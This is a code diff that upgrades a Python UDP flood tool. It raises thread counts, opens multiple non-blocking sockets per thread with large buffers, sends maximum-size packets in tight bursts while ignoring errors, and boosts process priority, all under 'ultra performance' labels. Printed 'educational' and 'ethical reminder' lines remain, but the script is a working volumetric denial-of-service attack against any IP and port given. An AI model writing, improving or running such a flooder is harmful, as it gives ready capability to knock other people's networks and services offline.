@@ -24,6 +24,7 @@ import time
 import sys
 import random
 import threading
+import os
 from datetime import datetime
 
 # Python 2/3 compatibility
@@ -50,7 +51,7 @@ else:
 
 
 class UDPPacketSender:
-    def __init__(self, target_ip, target_port, duration, threads=16):
+    def __init__(self, target_ip, target_port, duration, threads=32):
         """Initialize the UDP packet sender with target parameters."""
         try:
             # Validate IP address
@@ -77,95 +78,125 @@ class UDPPacketSender:
             if duration <= 0:
                 print("Error: Duration must be positive")
                 sys.exit(1)
-            if duration > 20:  # Limit to 20 seconds for educational purposes
-                print("Warning: Maximum duration is 20 seconds for educational purposes")
-                self.duration = 20
+            if duration > 15:  # Limit to 15 seconds for educational purposes
+                print("Warning: Maximum duration is 15 seconds for educational purposes")
+                self.duration = 15
             else:
                 self.duration = duration
         except ValueError:
             print("Error: Duration must be a number")
             sys.exit(1)
             
-        # Maximum performance parameters
+        # ULTRA PERFORMANCE SETTINGS
         self.packet_size = 65507  # Maximum UDP packet size
-        self.threads = min(threads, 32)  # More threads for higher throughput
+        self.threads = min(threads, 64)  # More threads for higher throughput
+        self.sockets_per_thread = 8  # Multiple sockets per thread
         self.stop_event = threading.Event()
         self.lock = threading.Lock()
         self.packets_sent = 0
         self.bytes_sent = 0
         
-        # Pre-generate packets for maximum efficiency
-        self.packets = []
-        for _ in range(5):  # Create 5 different packet patterns
-            if PY2:
-                self.packets.append(''.join(chr(random.randint(0, 255)) for _ in range(self.packet_size)))
+        # Pre-generate a single large packet for maximum efficiency
+        if PY2:
+            self.packet = ''.join(chr(random.randint(0, 255)) for _ in range(self.packet_size))
+        else:
+            self.packet = bytes(random.randint(0, 255) for _ in range(self.packet_size))
+        
+        # Try to set process priority to high
+        try:
+            if sys.platform == 'win32':
+                import psutil
+                p = psutil.Process(os.getpid())
+                p.nice(psutil.HIGH_PRIORITY_CLASS)
             else:
-                self.packets.append(bytes(random.randint(0, 255) for _ in range(self.packet_size)))
+                os.nice(-10)  # Lower value = higher priority
+        except:
+            pass  # Ignore if we can't set priority
+    
+    def create_socket(self):
+        """Create an optimized UDP socket."""
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        
+        # Maximum performance socket options
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4194304)  # 4MB buffer
+        sock.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 0x10)  # LOWDELAY
+        
+        # Try to set additional performance options
+        try:
+            # Set non-blocking mode
+            sock.setblocking(0)
+        except:
+            pass
+            
+        return sock
     
     def sender_thread(self, thread_id):
-        """Thread function to send UDP packets."""
-        # Create a socket for each thread
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            
-            # Set socket options for maximum performance
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)  # Very large send buffer
-            
-            # Disable Nagle's algorithm for UDP (not strictly necessary, but good practice)
-            sock.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 0x10)  # LOWDELAY
-            
-            # Try to set non-blocking mode
+        """Thread function to send UDP packets using multiple sockets."""
+        # Create multiple sockets for this thread
+        sockets = []
+        for i in range(self.sockets_per_thread):
             try:
-                sock.setblocking(0)
-            except:
-                pass
-                
-        except socket.error as e:
-            print("Thread %d: Socket creation failed: %s" % (thread_id, e))
+                sock = self.create_socket()
+                sockets.append(sock)
+            except socket.error as e:
+                print("Thread %d: Socket %d creation failed: %s" % (thread_id, i, e))
+        
+        if not sockets:
+            print("Thread %d: All socket creations failed" % thread_id)
             return
             
-        # Use pre-generated packets
-        packet = self.packets[thread_id % len(self.packets)]
+        # Get the pre-generated packet
+        packet = self.packet
+        packet_len = len(packet)
         
         # Send packets as fast as possible until stop event is set
         local_count = 0
+        socket_count = len(sockets)
+        
+        # Prepare destination address
+        dest = (self.target_ip, self.target_port)
+        
         while not self.stop_event.is_set():
-            try:
-                # Send the packet as fast as possible in a tight loop
-                for _ in range(100):  # Send bursts of packets
-                    sock.sendto(packet, (self.target_ip, self.target_port))
-                    local_count += 1
-                
-                # Update counters occasionally (not every packet, to reduce lock contention)
-                if local_count % 1000 == 0:
-                    with self.lock:
-                        self.packets_sent += 1000
-                        self.bytes_sent += 1000 * len(packet)
-                    
-            except socket.error:
-                # Socket buffer might be full, continue without delay
-                continue
-            except Exception as e:
-                print("Thread %d: Error sending packet: %s" % (thread_id, e))
-                break
+            # Send on all sockets in a tight loop
+            for sock_idx in range(socket_count):
+                try:
+                    # Send multiple packets per socket
+                    sock = sockets[sock_idx]
+                    for _ in range(200):  # Large burst per socket
+                        sock.sendto(packet, dest)
+                        local_count += 1
+                except:
+                    # Ignore any errors and continue at maximum speed
+                    continue
+            
+            # Update counters occasionally to reduce lock contention
+            if local_count >= 10000:
+                with self.lock:
+                    self.packets_sent += local_count
+                    self.bytes_sent += local_count * packet_len
+                local_count = 0
                 
         # Final update of counters
-        with self.lock:
-            remainder = local_count % 1000
-            if remainder > 0:
-                self.packets_sent += remainder
-                self.bytes_sent += remainder * len(packet)
+        if local_count > 0:
+            with self.lock:
+                self.packets_sent += local_count
+                self.bytes_sent += local_count * packet_len
                 
         # Clean up
-        sock.close()
+        for sock in sockets:
+            try:
+                sock.close()
+            except:
+                pass
     
     def start_sending(self):
         """Start multiple threads to send UDP packets."""
         print("\nETHICAL REMINDER: Only use on systems you own or have permission to test!\n")
         print("Starting UDP packet sending to %s:%d" % (self.target_ip, self.target_port))
-        print("Duration: %.2f seconds, Packet size: %d bytes, Threads: %d" % 
-              (self.duration, self.packet_size, self.threads))
-        print("MAXIMUM PERFORMANCE MODE ENABLED - UTILIZING FULL NETWORK CAPACITY")
+        print("Duration: %.2f seconds, Packet size: %d bytes" % (self.duration, self.packet_size))
+        print("Threads: %d, Sockets per thread: %d (Total sockets: %d)" % 
+              (self.threads, self.sockets_per_thread, self.threads * self.sockets_per_thread))
+        print("ULTRA PERFORMANCE MODE - MAXIMUM NETWORK UTILIZATION")
         print("-" * 60)
         
         # Create and start sender threads
@@ -184,7 +215,7 @@ class UDPPacketSender:
             last_time = start_time
             
             while time.time() - start_time < self.duration:
-                time.sleep(0.25)  # Update stats more frequently
+                time.sleep(0.2)  # Update stats more frequently
                 
                 current_time = time.time()
                 elapsed = current_time - start_time
@@ -213,12 +244,9 @@ class UDPPacketSender:
         except KeyboardInterrupt:
             print("\nPacket sending interrupted by user")
         finally:
-            # Signal threads to stop and wait for them
+            # Signal threads to stop
             self.stop_event.set()
             
-            for t in threads:
-                t.join(timeout=0.5)
-                
             # Print summary
             elapsed_time = time.time() - start_time
             self.print_summary(elapsed_time)
@@ -232,7 +260,8 @@ class UDPPacketSender:
         print("Packet size: %d bytes" % self.packet_size)
         
         mb_sent = self.bytes_sent / (1024 * 1024)
-        print("Total data sent: %.2f MB (%d bytes)" % (mb_sent, self.bytes_sent))
+        gb_sent = mb_sent / 1024
+        print("Total data sent: %.2f GB (%.2f MB)" % (gb_sent, mb_sent))
         print("Time elapsed: %.2f seconds" % elapsed_time)
         
         if elapsed_time > 0:
